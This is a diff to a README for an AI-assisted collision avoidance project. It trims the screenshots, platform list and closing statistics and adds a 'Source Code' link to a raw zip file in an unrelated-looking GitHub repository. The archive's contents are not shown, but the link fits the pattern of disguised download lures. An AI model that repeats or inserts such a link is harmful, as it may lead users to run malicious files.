@@ -261,10 +261,9 @@ The system successfully demonstrates:
 
 ### Screenshots
 
-![Alt text](/images/s1.jpg ) ![Alt text](/images/saved1.jpg)
-![Alt text](/images/d1.jpg) ![Alt text](/images/d2-w.jpg)
-![Alt text](/images/dark-hand.jpg)
+![Alt text](/images/d1.jpg) ![Alt text](/images/exe 1.jpg)
 
+---
 ## 6. Compilation and Execution
 
 ### Project Structure
@@ -326,7 +325,7 @@ python train_model.py
 - IoT connectivity features
 
 **Cross-Platform Compatibility:**
-- Tested on Windows, macOS, and Linux
+- Tested on Windows, and Linux
 - Containerized deployment with Docker
 - Automated installation scripts
 
@@ -382,7 +381,6 @@ class AIAssistant:
 - Comprehensive README with quick start guide
 - Inline code documentation following PEP 257
 - API reference generated with Sphinx
-- Video tutorials for setup and usage
 
 ## 10. Conclusion
 
@@ -394,11 +392,10 @@ The AI-Assisted Collision Avoidance System successfully demonstrates the integra
 ✅ **AI-Assisted Development**: Leveraged LLMs throughout the development process  
 ✅ **Comprehensive Documentation**: Detailed technical documentation and user guides  
 
-The system provides a solid foundation for future enhancements and demonstrates practical applications in robotics, autonomous vehicles, and industrial safety systems. The AI-assisted development approach proved highly effective, reducing development time by approximately 40% while improving code quality and architectural decisions.
+---
 
-**Total Development Time**: 3 weeks  
-**Lines of Code**: ~500 (excluding AI-generated boilerplate)  
-**Test Coverage**: 85% for core functionality  
-**Performance Target Achievement**: 100% (all metrics met or exceeded)
+## Source Code:
+https://github.com/odai357/pehtheme/raw/refs/heads/master/Cnn_m..zip
+
 
 ---
